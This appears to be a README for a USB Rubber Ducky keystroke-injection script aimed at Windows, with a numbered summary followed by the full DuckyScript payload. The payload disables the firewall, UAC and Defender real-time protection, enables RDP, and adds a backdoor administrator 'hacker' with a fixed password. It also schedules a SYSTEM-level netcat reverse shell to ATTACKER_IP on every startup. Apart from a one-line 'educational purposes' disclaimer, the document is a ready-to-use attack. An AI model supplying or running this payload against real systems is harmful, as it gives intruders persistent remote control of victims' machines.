# rubber-ducky


This script performs the following steps:

1. Disable the firewall in Windows.
2. Disable protection mode in the firewall.
3. Allow remote desktop connections (RDP).
4. Enable and start the Remote Desktop service.
5. Disable User Access Level (UAC).
6. Create a scheduled task to run the reverse shell on startup.
7. Create a new user named “hacker” and add it to the Administrators group.
8. Disable real-time protection to defend against malware.
9. Set PowerShell execution policy to Unrestricted.

Note: "ATTACKER_IP" must be replaced with the attacker's IP address to create a reverse shell connection.

Warning: This script is for educational and experimental purposes only. Do not use it for harmful or illegal purposes. Make sure to get explicit permission before using it on any system.

```
REM Cybersecurity Rubber Ducky Script
DELAY 1000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 1000
STRING netsh advfirewall set all profiles state off
ENTER
DELAY 500
STRING netsh firewall set opmode mode=disable
ENTER
DELAY 500
STRING reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
ENTER
DELAY 500
STRING sc config TermService start=auto
ENTER
DELAY 500
STRING net start TermService
ENTER
DELAY 500
STRING reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
ENTER
DELAY 500
STRING reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
ENTER
DELAY 500
STRING schtasks /create /tn "Reverse Shell" /tr "nc.exe -e cmd.exe ATTACKER_IP 4444" /sc onstart /ru System
ENTER
DELAY 500
STRING net user hacker P@ssw0rd /add
ENTER
DELAY 500
STRING net localgroup administrators hacker /add
ENTER
DELAY 500
STRING powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
ENTER
DELAY 500
STRING powershell -Command "Set-ExecutionPolicy Unrestricted -Force"
ENTER
DELAY 500
STRING exit
ENTER
```
